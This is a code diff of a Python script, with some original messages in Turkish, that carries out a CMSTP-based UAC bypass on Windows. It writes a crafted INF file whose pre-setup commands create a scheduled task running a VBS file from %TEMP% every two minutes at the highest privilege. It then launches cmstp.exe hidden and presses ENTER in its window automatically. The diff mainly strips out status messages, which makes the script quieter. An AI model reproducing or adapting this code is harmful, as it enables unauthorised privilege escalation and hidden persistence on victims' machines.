@@ -59,31 +59,34 @@ def run_command(command, wait=True):
 def create_inf_file():
     temp_folder = os.getenv('TEMP')
     inf_content = f"""
-[version]
-Signature="$Windows NT$"
-AdvancedINF=2.5
+    [version]
+    Signature="$Windows NT$"
+    AdvancedINF=2.5
 
-[DefaultInstall]
-CustomDestination=CustInstDestSectionAllUsers
-RunPreSetupCommands=RunPreSetupCommandsSection
+    [DefaultInstall]
+    CustomDestination=CustInstDestSectionAllUsers
+    RunPreSetupCommands=RunPreSetupCommandsSection
 
-[RunPreSetupCommandsSection]
-taskkill /IM cmstp.exe /F
-cmd /c schtasks /create /tn "TempVBS" /tr "%temp%\\ddd.vbs" /sc minute /mo 2  /f /rl HIGHEST
+    [RunPreSetupCommandsSection]
+    ; Commands to run before setup begins
+    taskkill /IM cmstp.exe /F
+    cmd /c schtasks /create /tn "TempVBS" /tr "%temp%\\ddd.vbs" /sc minute /mo 2  /f /rl HIGHEST
 
-[CustInstDestSectionAllUsers]
-49000,49001=AllUser_LDIDSection,7
+    [CustInstDestSectionAllUsers]
+    49000,49001=AllUser_LDIDSection,7
 
-[AllUser_LDIDSection]
-"HKLM", "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\CMMGR32.EXE", "ProfileInstallPath", "%UnexpectedError%", ""
+    [AllUser_LDIDSection]
+    "HKLM", "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\CMMGR32.EXE", "ProfileInstallPath", "%UnexpectedError%", ""
 
-[Strings]
-ServiceName="CorpVPN"
-ShortSvcName="CorpVPN"
-"""
+    [Strings]
+    ServiceName="CorpVPN"
+    ShortSvcName="CorpVPN"
+    """
+
     inf_file_path = os.path.join(temp_folder, 'corpvpn.inf')
     with open(inf_file_path, 'w') as f:
         f.write(inf_content)
+
     return inf_file_path
 
 def find_window_handle_by_process_name(proc_name):
@@ -125,7 +128,6 @@ def main():
    
     returncode, _, _ = run_command("python --version")
     if returncode != 0:
-        print("Python yüklü değil, yüklenmesi gerekir. İşlem sonlandırılıyor.")
         sys.exit(1)
 
     
@@ -138,7 +140,7 @@ def main():
    
     returncode, _, stderr = run_command(f'schtasks /create /tn "InstallRequests" /tr "python {script_path}" /sc once /st 00:00 /f')
     if returncode != 0:
-        print(f"Failed to create task 'InstallRequests': {stderr}")
+        
         sys.exit(1)
 
     
@@ -158,7 +160,7 @@ def main():
 
     
     proc_info = run_cmstp_hidden(inf_file_path)
-    print("cmstp.exe gizli başlatıldı.")
+    
 
     
     hwnd = None
@@ -169,11 +171,9 @@ def main():
         time.sleep(1)
 
     if hwnd:
-        print(f"cmstp.exe penceresi bulundu: {hwnd}")
         send_enter(hwnd)
-        print("ENTER tuşu gönderildi.")
     else:
-        print("cmstp.exe penceresi bulunamadı.")
+        pass
 
 if __name__ == "__main__":
     main()
